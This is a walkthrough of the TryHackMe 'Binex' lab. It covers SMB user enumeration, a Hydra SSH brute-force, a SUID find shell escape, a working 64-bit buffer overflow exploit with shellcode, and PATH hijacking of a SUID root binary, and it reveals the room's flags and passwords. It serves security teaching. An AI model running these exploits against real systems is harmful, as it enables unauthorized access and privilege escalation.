# Binex — TryHackMe Walkthrough

> Escalate your privileges by exploiting vulnerable binaries. Exploit an SUID bit file, use GDB to take advantage of a buffer overflow and gain root by PATH manipulation.

<p align="center">
<a href="https://ibb.co/LDtWr7yX"><img src="https://i.ibb.co/twstzr6T/2e7fc08002cc56de2f61e8e46365ae8f.png" alt="2e7fc08002cc56de2f61e8e46365ae8f" border="0"></a></p>

<p align="center">
  <a href="https://tryhackme.com/room/binex">
    <img src="https://img.shields.io/badge/TryHackMe-Binex-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-SUID%20%7C%20Buffer%20Overflow%20%7C%20PATH%20Manipulation-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | SMB Enumeration — User Discovery via RID Cycling |
| 3 | Brute Forcing — SSH |
| 4 | Abusing SUID Binary (`find`) |
| 5 | 64-bit Buffer Overflow with Shellcode |
| 6 | PATH Variable Manipulation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Use enum4linux to enumerate SMB users via RID cycling
- Brute-force SSH credentials using Hydra
- Exploit a SUID `find` binary using GTFOBins
- Understand the structure of a 64-bit buffer overflow and craft a working exploit
- Use PATH variable manipulation to trick a SUID root binary into executing a malicious `ps` command

---

## Prerequisites

- Basic familiarity with Linux terminal commands and x86-64 assembly concepts
- Nmap, enum4linux, Hydra, and GDB installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Gain Initial Access

---

### Step 1 — Network Enumeration

**Approach:** Run a full port scan with service detection to identify all open services.

```
kali@kali:~/CTFs/tryhackme/Binex$ sudo nmap -p- -Pn -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 17:41 CEST
Nmap scan report for Machine_IP
Host is up (0.037s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 428.31 seconds
```

> **Note:** Three ports are open — **SSH on 22** and **Samba SMB on 139/445**. SMB message signing is disabled — a common misconfiguration. The hostname `THM_EXPLOIT` hints at the room's purpose. The next step is to enumerate SMB for user accounts.

---

### Step 2 — SMB User Enumeration with enum4linux

**Approach:** Use enum4linux to perform a full SMB enumeration including RID cycling to discover local Unix users.

```
kali@kali:~/CTFs/tryhackme/Binex$ enum4linux -a Machine_IP
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
enum4linux complete on Mon Oct 12 17:53:18 2020
```

> **Note:** RID cycling via SID `S-1-22-1` reveals four Unix users: **kel**, **des**, **tryhackme**, and **noentry**. The `S-1-22-1` SID range is specific to Unix UIDs mapped through Samba. This is a valuable technique for discovering Linux usernames when SMB is available without needing any credentials.

---

### Step 3 — Brute-Forcing SSH with Hydra

**Approach:** Try brute-forcing SSH for the `tryhackme` user using `rockyou.txt`.

```
kali@kali:~/CTFs/tryhackme/Binex$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://Machine_IP
Hydra v9.0 (c) 2019 by van Hauser/THC

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)
[DATA] attacking ssh://Machine_IP:22/
[22][ssh] host: Machine_IP   login: tryhackme   password: thebest
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 18:03:00
```

> **Note:** Hydra cracks the SSH password for `tryhackme` as **`thebest`**. Log in with `ssh tryhackme@Machine_IP` to get the initial shell.

---

### Question 1 — Initial access credentials

<details>
<summary>Reveal Answer</summary>

**`tryhackme:thebest`**

</details>

---

## Task 2 — SUID :: Binary 1

Read flag.txt from des's home directory.

---

### Step 4 — Exploiting the SUID find Binary

**Approach:** Search for SUID binaries owned by `des`. The `find` binary has the SUID bit set — use the GTFOBins technique to spawn a shell as `des`.

```
tryhackme@THM_exploit:~$ find / -type f -perm -u=s -user des -ls 2> /dev/null
   262721    236 -rwsr-sr-x   1 des      des        238080 Nov  5  2017 /usr/bin/find
tryhackme@THM_exploit:~$ find . -exec /bin/bash -p \; -quit
bash-4.4$ whoami
des
bash-4.4$ cd /home/des/
bash-4.4$ cat flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{exploit_the_SUID}

login credential (In case you need it)
username: des
password: destructive_72656275696c64
```

> **Note:** `/usr/bin/find` has the SUID bit set and is owned by `des`. The GTFOBins technique `find . -exec /bin/bash -p \; -quit` uses `find`'s `-exec` flag to launch bash with the `-p` flag, which preserves the SUID effective UID. This spawns a shell running as `des`. See [GTFOBins/find](https://gtfobins.github.io/gtfobins/find/#suid). The flag also reveals des's plaintext password for direct SSH login if needed.

---

### Question 2 — /home/des/flag.txt

<details>
<summary>Reveal Answer</summary>

**`THM{exploit_the_SUID}`**

</details>

---

## Task 3 — Buffer Overflow :: Binary 2

Read flag.txt from kel's home directory. The SUID binary `bof` in des's home directory is owned by `kel` — exploiting its buffer overflow runs code as `kel`.

---

### Step 5 — Analysing the Vulnerable Binary

**Approach:** Read the C source code to understand the vulnerability, then craft a 64-bit buffer overflow exploit.

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
        char buffer[600];
        int characters_read;
        printf("Enter some string:\n");
        characters_read = read(0, buffer, 1000);
        printf("You entered: %s", buffer);
        return 0;
}

void main(){
        setresuid(geteuid(), geteuid(), geteuid());
        setresgid(getegid(), getegid(), getegid());
        foo();
}
```

> **Note:** The `buffer` is declared as 600 bytes, but `read()` will accept up to **1000 bytes**. Writing more than the buffer size overflows into adjacent stack memory and can overwrite the saved return address, redirecting execution. The `setresuid(geteuid(), ...)` call means if `bof` has the SUID bit set as `kel`, the process runs with `kel`'s effective UID — so shellcode executed via the overflow runs as `kel`.

Confirm the overflow crashes the binary:

```
des@THM_exploit:~$ echo $(python -c 'print("A" * 650)') | ./bof
Enter some string:
Segmentation fault (core dumped)
```

---

### Step 6 — Writing and Running the Buffer Overflow Exploit

**Approach:** Use GDB with pattern_create/pattern_offset to find the exact offset, then craft the payload: NOP sled + shellcode + padding + return address pointing into the NOP sled on the stack.

**Exploit structure:**
- **400 bytes** of NOP sled (`\x90`) — gives a wide landing zone for the return address
- **24 bytes** of shellcode — executes `/bin/sh` as `kel`
- **Padding** — fills remaining buffer space to reach the saved RIP
- **8 bytes** — dummy value to overwrite RBP
- **Return address** — points into the NOP sled region on the stack (found via GDB by reading RSP)

```python
from struct import pack

buf = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = "\x90" * 400
payload += buf
payload += "A" * (208 - len(buf))
payload += "B" * 8
payload += pack("<Q", 0x7fffffffe300)

print payload
```

```
des@THM_exploit:~$ python exploit.py > test
des@THM_exploit:~$ (cat test;cat) | ./bof
Enter some string:
id
uid=1000(kel) gid=1001(des) groups=1001(des)
cd /home/kel
cat flag.txt
You flag is THM{buffer_overflow_in_64_bit}

The user credential
username: kel
password: kelvin_74656d7065726174757265
```

> **Note:** The `(cat test;cat) | ./bof` pattern sends the exploit payload first, then keeps stdin open so we can type commands interactively into the spawned shell. The `uid=1000(kel)` confirms successful privilege escalation via the buffer overflow. The return address `0x7fffffffe300` is obtained from GDB by inspecting the RSP register after triggering the overflow — it must point somewhere inside the NOP sled. The shellcode `\x50\x48\x31\xd2...` is a 64-bit `execve("/bin//sh", NULL, NULL)` syscall.

---

### Question 3 — /home/kel/flag.txt

<details>
<summary>Reveal Answer</summary>

**`THM{buffer_overflow_in_64_bit}`**

</details>

---

## Task 4 — PATH Manipulation :: Binary 3

Get the root flag from /root/. The `exe` binary in kel's home directory is owned by root with the SUID bit set. It calls `ps` without specifying a full path — meaning it searches the PATH variable for an executable named `ps`.

---

### Step 7 — PATH Variable Manipulation

**Approach:** Create a malicious script named `ps` in `/tmp` that launches `/bin/bash`, prepend `/tmp` to the PATH, then run `exe`. Since `exe` runs as root and calls `ps` via PATH lookup, it will find and execute our malicious `ps` instead.

```
kel@THM_exploit:~$ cd /tmp
kel@THM_exploit:/tmp$ echo "/bin/bash" > ps
kel@THM_exploit:/tmp$ chmod +x ps
kel@THM_exploit:/tmp$ export PATH=/tmp:$PATH
kel@THM_exploit:/tmp$ cd /home/kel
kel@THM_exploit:~$ ./exe
id
uid=0(root) gid=0(root) groups=0(root),1001(des)
cat /root/root.txt
The flag: THM{SUID_binary_and_PATH_exploit}.
Also, thank you for your participation.

The room is built with love. DesKel out.
```

> **Note:** When `exe` runs, it calls `ps` — but because `/tmp` is now first in PATH, the shell finds `/tmp/ps` before `/bin/ps`. Our malicious `ps` contains `/bin/bash`, so a bash shell spawns with root privileges (inherited from `exe`'s SUID root ownership). This is why it is critical for SUID binaries to always use **absolute paths** for any programs they call — never relative command names that depend on PATH.

---

### Question 4 — /root/root.txt

<details>
<summary>Reveal Answer</summary>

**`THM{SUID_binary_and_PATH_exploit}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan | Found SSH (22) and SMB (139/445) |
| 2 | enum4linux RID cycling | Discovered users: kel, des, tryhackme, noentry |
| 3 | Hydra SSH brute-force | Cracked `tryhackme:thebest` |
| 4 | SUID `find` exploitation (GTFOBins) | Spawned shell as `des`, read `flag.txt` and des's credentials |
| 5 | Analysed `bof64.c` source code | Identified buffer overflow: 600-byte buffer, 1000-byte read |
| 6 | 64-bit buffer overflow exploit | Spawned shell as `kel`, read `flag.txt` and kel's credentials |
| 7 | Created malicious `/tmp/ps` + PATH prepend | Tricked SUID root `exe` into executing our shell, read `root.txt` |
